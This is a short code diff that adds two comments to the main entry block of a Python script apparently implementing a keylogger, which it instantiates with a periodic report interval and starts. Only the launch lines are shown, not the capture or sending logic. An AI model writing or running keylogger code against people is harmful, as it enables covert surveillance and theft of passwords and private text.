@@ -83,5 +83,6 @@ class Keylogger:
 
 
 if __name__ == "__main__":
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
+    # main program starts from here
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY) #keylogger function
     keylogger.start()
